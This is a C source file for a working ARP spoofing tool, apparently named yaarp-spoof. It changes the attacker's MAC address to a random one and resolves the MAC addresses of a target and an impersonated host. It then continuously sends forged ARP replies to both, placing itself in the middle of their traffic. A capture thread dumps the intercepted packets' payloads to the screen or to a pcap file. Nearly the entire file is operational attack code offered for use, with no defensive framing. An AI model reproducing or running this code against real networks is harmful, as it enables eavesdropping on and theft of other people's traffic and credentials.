//
// Created by @RicoVlad on 4/30/23.
//

#include <stdio.h>
#include <stdlib.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <time.h>
#include <unistd.h>
#include <pcap/pcap.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <assert.h>
#include <errno.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <argp.h>
#include "yaarp-spoof.h"

volatile sig_atomic_t sigint_received = 0;
pthread_t t1,t2;

void
generateRandomMacAddr(unsigned char* mac_addr)
{
    // Not true RNG but ... who cares ?
    srand((unsigned int) time(NULL));
    for(int i = 0; i < ETH_ALEN; i++){
        mac_addr[i] = rand() % 256;
    }
    // Avoid multicast address
    mac_addr[0] &= 0xFE;
}

int
changeMacAddr(unsigned char* mac_addr, char* interface)
{
    struct ifreq ifr;
    int sockfd;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd == -1){
        printf("Error while opening socket to change mac addr");
        return EXIT_FAILURE;
    }

    strncpy(ifr.ifr_name, interface, strlen(interface)+1);
    memcpy(ifr.ifr_hwaddr.sa_data,mac_addr,ETH_ALEN);
    ifr.ifr_hwaddr.sa_family = ARPHRD_ETHER;
    errno = 0;
    if(ioctl(sockfd, SIOCSIFHWADDR, &ifr) == -1){
        printf("\nCan't set the mac addr: ");
        for (int i = 0; i < ETH_ALEN; ++i) {
            printf("%02x%s", mac_addr[i], (i == ETH_ALEN - 1) ? " " : ":"); // Print the MAC address in the usual format
        }
        printf("for interface %s\n", interface);
        exit(EXIT_FAILURE);
    }
    return EXIT_SUCCESS;
}

int
getMacAddr(unsigned char original_mac[ETH_ALEN], const char* interface)
{
    struct ifreq ifr;
    int sockfd;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd == -1){
        printf("Error while opening socket to get mac addr");
        return EXIT_FAILURE;
    }
    strncpy(ifr.ifr_name, interface, strlen(interface));
    assert(ioctl(sockfd, SIOCGIFHWADDR, &ifr) != -1);
    close(sockfd);
    memcpy(original_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

    return EXIT_SUCCESS;
}

int
resolveMacAddr(char *interface, unsigned char *target_ip, unsigned char *random_mac, unsigned char *resolved_mac, int nbRetries)
{
    pcap_t *handle = prepareConnection(interface);
    unsigned char source_ip[4];
    if(inet_pton(AF_INET, getIpFromInterface(interface),source_ip) == -1){
        printf("Error while converting impersonate IP");
        exit(EXIT_FAILURE);
    }

    // Broadcast mac
    unsigned char broadcast_mac[ETH_ALEN] =
            {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    Packet *packet = craftPacket(random_mac,
                                 source_ip,
                                 broadcast_mac,
                                 target_ip,
                                 ARPOP_REQUEST);


    // Send nbRetries ARP broadcast packet to "ensure" an answer from target
    for (int i=0; i < nbRetries; i++){
        if(sendArpPacket(handle, packet)  < 1 ){
            fprintf(stderr,"Error sending ARP packet when resolving mac addr");
            free(packet);
            pcap_close(handle);
            exit(EXIT_FAILURE);
        }
    }

    if(receiveArpPacket(handle, resolved_mac) != 0){
        fprintf(stderr,"Error receiving ARP packet when resolving mac addr");
        free(packet);
        pcap_close(handle);
        exit(EXIT_FAILURE);
    }

    free(packet);
    pcap_close(handle);
    return 0;
}

char*
getIpFromInterface(char* name)
{
    int sockfd;
    struct ifreq ifr;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, name, IFNAMSIZ-1);
    if(ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl error");
        exit(1);
    }
    close(sockfd);

    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}


Packet*
craftPacket(unsigned char *sender_mac, unsigned char* sender_ip, unsigned char *target_mac, unsigned char *target_ip, int ARPOP_CODE)    // Ethernet header
{
    struct ether_header ethernet_header;
    ethernet_header.ether_type = htons(ETHERTYPE_ARP); // Packet type ID field
    memcpy(ethernet_header.ether_shost, sender_mac, ETH_ALEN); // set source mac addr
    memcpy(ethernet_header.ether_dhost, target_mac, ETH_ALEN); // set destination mac addr

    // ARP header
    struct arphdr arp_header;
    arp_header.ar_hrd = htons(ARPHRD_ETHER); // Format of hardware address
    arp_header.ar_pro = htons(ETHERTYPE_IP); // Format of protocol address
    arp_header.ar_hln = ETH_ALEN; // Length of hardware address
    arp_header.ar_pln = 4; // Length of protocol address
    arp_header.ar_op = htons(ARPOP_CODE); // ARP opcode

    // ARP Body
    ArpBody *arp_body = calloc(1,sizeof(ArpBody));
    memcpy(arp_body->ar_sha, sender_mac, ETH_ALEN);
    memcpy(arp_body->ar_tha, target_mac, ETH_ALEN);

    memcpy(arp_body->ar_sip, sender_ip, 4);
    memcpy(arp_body->ar_tip, target_ip, 4);

    ArpPacket *arp = calloc(1, sizeof(ArpPacket));
    memcpy(arp,&arp_header,sizeof(struct arphdr));
    memcpy(&arp->body,arp_body,sizeof(ArpBody));

    Packet *packet = calloc(1,sizeof(Packet));
    memcpy(packet,&ethernet_header,sizeof(struct ether_header));
    memcpy(&packet->arp,arp,sizeof(ArpPacket));

    return packet;
}

pcap_t*
prepareConnection(char* interface)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf);
    if (handle == NULL) {
        printf("Error opening device: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    return handle;
}

int
sendArpPacket(pcap_t *handle, Packet *packet)
{
    int nbBytes;
    if ((nbBytes = pcap_inject(handle, (unsigned char*)packet, sizeof(*packet))) < 1) {
        printf("Error sending packet: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        exit(EXIT_FAILURE);
    }

    return nbBytes;
}

int
receiveArpPacket(pcap_t *handle, uint8_t mac[ETH_ALEN])
{
    const u_char *receiv_packet;
    struct pcap_pkthdr header;
    receiv_packet = pcap_next(handle, &header);
    if (receiv_packet == NULL) {
        fprintf(stderr, "No packet received.\n");
        return 1;
    }

    // Extract the MAC address from the response packet
    struct ether_header *eth = (struct ether_header *) receiv_packet;
    memcpy(mac, &eth->ether_shost, ETH_ALEN);

    return 0;
}

void*
threadSendArpPacket(void* tArgs)
{
    threadArgs *myArg = (threadArgs*)tArgs;
    myArg->handle_send = prepareConnection(myArg->interface);
    if(myArg->handle_send == NULL){
        printf("Error while preparing connection to send ARP requests");
        exit(EXIT_FAILURE);
    }

    while(myArg->running == 1){
        sendArpPacket(myArg->handle_send,&myArg->p[0]);
        // Added nanosleep because too much ARP packet are sended otherwise
        nanosleep((const struct timespec[]){{0, myArg->time}}, NULL);
        sendArpPacket(myArg->handle_send,&myArg->p[1]);
    }
    pcap_close(myArg->handle_send);
    pthread_exit(NULL);
}

void*
parsePacket(const u_char *pkt_data)
{
    /*struct ether_header *eth_header;
    struct ip *ip_header;
    struct tcphdr *tcp_header;
    struct udphdr *udp_header;

    // parse ethernet header
    eth_header = (struct ether_header*) pkt_data;

    // check if it's an IP packet
    if (ntohs(eth_header->ether_type) == ETHERTYPE_IP) {
        // parse IP header
        ip_header = (struct ip*) (pkt_data + sizeof(struct ether_header));

        // check protocol
        switch (ip_header->ip_p) {
            case IPPROTO_TCP:
                // parse TCP header
                tcp_header = (struct tcphdr*) (pkt_data + sizeof(struct
                        ether_header) + sizeof(struct ip));
                printf("Protocol: TCP \n| Source IP: %s:%d  | Target IP: %s:%d \n",
                       inet_ntoa(ip_header->ip_src), ntohs(tcp_header->th_sport),
                       inet_ntoa(ip_header->ip_dst), ntohs(tcp_header->th_dport));
                break;
            case IPPROTO_UDP:
                // parse UDP header
                udp_header = (struct udphdr*) (pkt_data + sizeof(struct ether_header) + sizeof(struct ip));
                printf("Protocol: UDP\n| Source IP: %s:%d  | Target IP: %s:%d \n",
                       inet_ntoa(ip_header->ip_src), ntohs(udp_header->uh_sport),
                       inet_ntoa(ip_header->ip_dst), ntohs(udp_header->uh_sport));
                break;
            default:
                printf("Protocol: Unknown (%d)\n", ip_header->ip_p);
                break;
        }
    }*/

    return NULL;
}

void
printPacketHexDump(const struct pcap_pkthdr *header, const u_char *pkt_data)
{
    for (int i = 0; i < header->len; i++) {
        printf("%02x ", pkt_data[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
        else if ((i + 1) % 8 == 0) {
            printf(" ");
        }
    }
}

void
printPacketASCII(const struct pcap_pkthdr *header, const u_char *pkt_data)
{
    for (int i = 0; i < header->len; i++) {
        printf("%c%s%s",
               isprint(pkt_data[i]) ? pkt_data[i] : '.',
               ((i + 1) % 16 == 0 ) ? " " : "",
               ((i + 1) % 32 == 0 ) ? "\n" : "");
    }
}

void
packet_handler_saveToFile(u_char *param, const struct pcap_pkthdr *header, const
u_char *pkt_data)
{
    pcap_dump(param,header,pkt_data);
}

void
packet_handler(u_char *param, const struct pcap_pkthdr *header, const
u_char *pkt_data)
{

    //printf("Packet capture length: %d\n", header->caplen);
    //printf("Packet total length: %d\n", header->len);
    //printf("\n");

    //struct ether_header *eth_header;
    struct ip *ip_header;
    struct tcphdr *tcp_header;
    struct udphdr *udp_header;

    //eth_header = (struct ether_header*) (pkt_data);
    ip_header = (struct ip*) (pkt_data + ETH_HLEN);

    switch (ip_header->ip_p) {
        case IPPROTO_TCP:
            printf("Protocol: TCP\n");
            // parse TCP header
            tcp_header = (struct tcphdr*) (pkt_data + sizeof(struct ether_header) + sizeof(struct ip));
            /* print source and destination IP addresses */
            printf("From: %s:%d\n", inet_ntoa(ip_header->ip_src),ntohs(tcp_header->th_sport));
            printf("  To: %s:%d\n", inet_ntoa(ip_header->ip_dst),ntohs(tcp_header->th_dport));
            break;
        case IPPROTO_UDP:
            printf("Protocol: UDP\n");
            // parse UDP header
            udp_header = (struct udphdr*) (pkt_data + sizeof(struct ether_header) + sizeof(struct ip));
            /* print source and destination IP addresses */
            printf("From: %s:%d\n", inet_ntoa(ip_header->ip_src),ntohs(udp_header->uh_sport));
            printf("  To: %s:%d\n", inet_ntoa(ip_header->ip_dst),ntohs(udp_header->uh_dport));
            break;
        case IPPROTO_ICMP:
            printf("Protocol: ICMP\n");
            break;
        case IPPROTO_IP:
            printf("Protocol: IP\n");
            break;
        default:
            printf("Protocol: Unknown (%d)\n", ip_header->ip_p);
            break;
    }

    printf("\nPayload hex dump:\n");
    printPacketHexDump(header,pkt_data);
    printf("\nPayload ASCII dump:\n");
    printPacketASCII(header,pkt_data);
    printf("\n\n\n");

}

void*
threadHandlePacket(void* tArgs)
{
    threadArgs *myArg = (threadArgs*)tArgs;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    bpf_u_int32 net;
    bpf_u_int32 mask;

    // Open the pcap device
    myArg->handle_receive = prepareConnection(myArg->interface);

    // Get the network and mask information
    if(pcap_lookupnet(myArg->interface, &net, &mask, errbuf) == PCAP_ERROR){
        fprintf(stderr,"Error with pcap_lookupnet");
        pcap_close(myArg->handle_receive);
        exit(EXIT_FAILURE);
    }

    // Compile and apply the filter
    if (pcap_compile(myArg->handle_receive, &fp, myArg->filter, 0, net) == PCAP_ERROR){
        fprintf(stderr,"Error with pcap_compile\n");
        fprintf(stderr,"%s",pcap_geterr(myArg->handle_receive));
        pcap_close(myArg->handle_receive);
        exit(EXIT_FAILURE);
    }
    if(pcap_setfilter(myArg->handle_receive, &fp) != 0){
        fprintf(stderr,"Error with pcap_filter");
        pcap_close(myArg->handle_receive);
        exit(EXIT_FAILURE);
    }

    pcap_dumper_t* dumper = NULL;

    if (myArg->output != NULL){
        dumper = pcap_dump_open_append(myArg->handle_receive,myArg->output);
        // Start capturing packets and call function to save output to file
        if (dumper != NULL){
            pcap_loop(myArg->handle_receive, -1, packet_handler_saveToFile, (u_char*) dumper);
        }else{
            printf("Error with pcap_dump_open_append");
            exit(EXIT_FAILURE);
        }
    }else{
        // Start capturing packets and call function packet_handler
        pcap_loop(myArg->handle_receive, -1, packet_handler, NULL);
    }

    // Called when main loop call pcap_breakloop
    if(dumper != NULL) pcap_dump_close(dumper);
    pcap_close(myArg->handle_receive);
    pthread_exit(NULL);
}

void
sigint_handler(int sig)
{
    sigint_received = 1;
    //pthread_kill(t1,SIGINT);
    //pthread_kill(t2,SIGINT);
}

static error_t
parse_opt(int key, char *arg, struct argp_state *state)
{
    AttackSettings *arguments = state->input;
    switch (key) {
        case 'i': arguments->interface = arg; break;
        case 'r': arguments->retry = atoi(arg); break;
        case 'f': arguments->filter = arg; break;
        case 'o': arguments->output = arg; break;
        case 't': arguments->time = atol(arg); break;
        case ARGP_KEY_ARG:
            // tricks to assign either argIP[0] or argIP[1]
            arguments->argIP[(state->arg_num % 2 == 0) ? 0 : 1] = arg;
            break;
        case ARGP_KEY_END:
            if(arguments->argIP[0] == NULL || arguments->argIP[1] == NULL || arguments->interface == NULL){
                argp_usage(state);
            }
            break;
        default: return ARGP_ERR_UNKNOWN;
    }

    return 0;
}

char*
read_file(char* filename)
{
    FILE *fp;
    char *buffer;
    long file_size;

    fp = fopen(filename, "rb");
    if (!fp) {
        fprintf(stderr, "Error opening file %s\n", filename);
        exit(1);
    }

    fseek(fp, 0L, SEEK_END);
    file_size = ftell(fp);
    rewind(fp);

    buffer = (char*) calloc (1,file_size);
    if (!buffer) {
        fprintf(stderr, "Error allocating memory for buffer\n");
        exit(1);
    }
    int nbRead = fread(buffer, 1, file_size, fp);
    if ( nbRead < file_size) {
        fprintf(stderr, "Error reading file %s\n", filename);
        fprintf(stderr,"Number of bytes read: %d", nbRead);
        fprintf(stderr,"File size: %ld", file_size);
        free(buffer);
        exit(1);
    }

    fclose(fp);

    return buffer;
}

int
main(int argc, char *argv[])
{
    AttackSettings settings = {
            .interface = NULL,
            .argIP[0] = NULL,
            .argIP[1] = NULL,
            .filter = NULL,
            .output = NULL,
            .retry = 5,
            .time = 50000
    };

    struct sigaction sa = {
            {sigint_handler},
            .sa_flags = SA_RESTART,
    };
    if (sigaction(SIGINT, &sa, NULL) == -1)
    {
        perror("sigaction() failed");
        exit(EXIT_FAILURE);
    }

    // Parsing arguments
    argp_parse(&argp, argc, argv, 0, 0, &settings);

    // Target IP
    printf("Target ip = %s\n", settings.argIP[0]);
    if(inet_pton(AF_INET,settings.argIP[0],settings.target_ip) == -1){
        printf("Error while converting target IP");
        exit(EXIT_FAILURE);
    }

    // Gateway IP
    printf("Target ip = %s\n", settings.argIP[1]);
    if(inet_pton(AF_INET,settings.argIP[1],settings.impersonate_ip) == -1){
        printf("Error while converting impersonate IP");
        exit(EXIT_FAILURE);
    }

    // Interface
    unsigned int index = if_nametoindex(settings.interface);
    // Interface doesn't exist
    if(index == 0){
        printf("Interface name %s is not valid\n",settings.interface);
        exit(EXIT_FAILURE);
    }else{
        settings.interface = settings.interface;
    }
    printf("Interface = %s\n", settings.interface);

    getMacAddr(settings.original_mac, settings.interface);
    printf("\nOriginal MAC Address:");
    for(int i=0; i< ETH_ALEN;i++){
        printf("%02x%s", settings.original_mac[i],(i == ETH_ALEN - 1) ? "\n" : ":");
    }

    generateRandomMacAddr(settings.random_mac);
    changeMacAddr(settings.random_mac,settings.interface);
    printf("\nRandomized MAC Address: ");
    for(int i=0; i< ETH_ALEN;i++){
        printf("%02x%s", settings.random_mac[i],(i == ETH_ALEN - 1) ? "\n" : ":");
    }

    printf("\nResolving Target MAC Address ...\n");
    resolveMacAddr(settings.interface,
                   settings.target_ip,
                   settings.random_mac,
                   settings.target_mac,
                   settings.retry);

    printf("Target MAC Address: ");
    for (int i = 0; i < ETH_ALEN; ++i) {
        printf("%02x%s", settings.target_mac[i], (i == ETH_ALEN - 1) ? "\n" : ":"); // Print the MAC address in the usual format
    }

    printf("\nResolving Impersonate MAC Address ...\n");
    resolveMacAddr(settings.interface,
                   settings.impersonate_ip,
                   settings.random_mac,
                   settings.impersonate_mac,
                   settings.retry);

    printf("Impersonate MAC Address: ");
    for (int i = 0; i < ETH_ALEN; ++i) {
        printf("%02x%s", settings.impersonate_mac[i], (i == ETH_ALEN - 1) ? "\n" : ":"); // Print the MAC address in the usual format
    }

    // Spoofed packet for target_ip
    Packet *p2 = craftPacket(settings.random_mac,
                             settings.impersonate_ip,
                             settings.target_mac,
                             settings.target_ip,
                             ARPOP_REPLY);

    // Spoofed packet for impersonate_ip
    Packet *p3 = craftPacket(settings.random_mac,
                             settings.target_ip,
                             settings.impersonate_mac,
                             settings.impersonate_ip,
                             ARPOP_REPLY);

    // THREAD TIME
    threadArgs tArgs;
    tArgs.interface = settings.interface;
    tArgs.handle_send = NULL;
    tArgs.handle_receive = NULL;
    tArgs.p[0] = *p2;
    tArgs.p[1] = *p3;
    tArgs.time = settings.time;
    tArgs.filter = settings.filter;
    tArgs.output = settings.output;
    tArgs.running = 1;

    //filter == not arp and host argv[1] and host argv[2]\0
    if(settings.filter == NULL){
        tArgs.filter = calloc(1, 64);
        snprintf(tArgs.filter,64,
                 "not arp and (host %s or host %s)",settings.argIP[0], settings.argIP[1]);
    }else{
        tArgs.filter = read_file(settings.filter);
    }
    printf("\nFilter: %s\n\n\n", tArgs.filter);

    //Spoofing thread
    pthread_create(&t1, NULL,&threadSendArpPacket,&tArgs);
    // Handler thread
    pthread_create(&t2, NULL,&threadHandlePacket,&tArgs);


    printf("Spoofing ...\n");
    while (sigint_received != 1){
        nanosleep((const struct timespec[]){{0,500000000L}}, NULL);
    }

    printf("Cleaning ...\n");

    tArgs.running = 0;
    pcap_breakloop(tArgs.handle_receive);
    pthread_join(t1,NULL);
    pthread_join(t2,NULL);

    changeMacAddr(settings.original_mac,settings.interface);

    free(p2);
    free(p3);
    free(tArgs.filter);

    return EXIT_SUCCESS;
}


